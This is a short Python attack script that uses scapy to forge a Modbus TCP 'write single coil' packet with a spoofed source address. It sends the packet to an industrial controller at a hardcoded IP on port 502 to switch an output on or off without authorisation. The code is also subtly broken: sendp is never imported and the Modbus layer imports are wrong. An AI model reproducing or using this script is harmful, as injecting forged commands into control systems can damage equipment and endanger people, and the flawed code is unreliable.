#!/usr/bin/env python3
from scapy.all import Ether, IP, TCP, ModbusADURequest, ModbusPDUWriteSingleCoil

def send_fake_modbus_packet(target_ip, target_port, coil_address, coil_value):
    # Replace the following values with appropriate addresses and ports
    source_ip = "172.17.0.3"
    source_port = 33538

    # Build the Modbus TCP packet
    modbus_packet = Ether()/IP(dst=target_ip, src=source_ip)/TCP(dport=target_port, sport=source_port)/ModbusADURequest()/ModbusPDUWriteSingleCoil(address=coil_address, value=coil_value)

    # Send the packet
    sendp(modbus_packet, iface="eth0")

if __name__ == "__main__":
    # Modify the following parameters accordingly
    target_ip = "192.168.1.10"
    target_port = 502
    coil_address = 1  # Assuming pin x is at coil address 1
    coil_value = True # Set the desired value (1 for ON, 0 for OFF)

    send_fake_modbus_packet(target_ip, target_port, coil_address, coil_value)
